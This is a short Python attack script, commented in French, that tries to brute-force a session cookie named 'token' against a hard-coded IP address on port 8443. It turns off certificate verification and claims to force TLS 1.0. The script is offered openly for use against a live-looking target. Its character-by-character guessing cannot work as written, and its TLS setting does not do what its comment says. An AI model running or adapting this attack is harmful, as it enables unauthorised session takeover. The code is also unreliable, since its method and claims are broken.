import ssl
import requests
from urllib3.poolmanager import PoolManager
from requests.adapters import HTTPAdapter

# Variables de base
TARGET_URL = "https://37.187.103.134:8443/"  # Remplacer par l'URL cible
COOKIE_NAME = "token"  # Nom du cookie à récupérer

# Créer un contexte SSL pour forcer TLS 1.0
class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context()
        context.set_ciphers('TLSv1')  # Forcer TLS 1.0
        kwargs['ssl_context'] = context
        return super().init_poolmanager(*args, **kwargs)

# Fonction pour tester le cookie
def try_guess(guess):
    headers = {
        "Cookie": f"{COOKIE_NAME}={guess}",
    }

    session = requests.Session()
    session.mount('https://', SSLAdapter())  # Utiliser l'adaptateur SSL pour forcer TLS 1.0

    try:
        # Faire la requête avec vérification SSL désactivée
        response = session.get(TARGET_URL, headers=headers, verify=False)
        print(f"Status code: {response.status_code}")
        if response.status_code == 200 and "Welcome" in response.text:  # Ajuste selon le message de succès
            print(f"[+] Cookie valide trouvé : {guess}")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur lors de la requête : {e}")
    return False

# Fonction pour récupérer le cookie complet via brute force
def recover_cookie():
    # Par exemple, on commence à tester des chaînes de caractères
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    cookie_length = 32  # Remplacer par la longueur réelle du cookie si connue

    # Commencer à tester chaque position du cookie
    found_cookie = ""
    for position in range(1, cookie_length + 1):
        print(f"[+] Position {position}:")
        for char in characters:
            guess = found_cookie + char + "a" * (cookie_length - position)
            if try_guess(guess):
                found_cookie += char
                break
    return found_cookie

if __name__ == "__main__":
    print("[*] Lancement de l'attaque brute-force...")
    final_cookie = recover_cookie()
    if final_cookie:
        print(f"\n=== COOKIE RETROUVÉ ===\n{COOKIE_NAME}={final_cookie}")
    else:
        print("[!] Aucun cookie trouvé.")

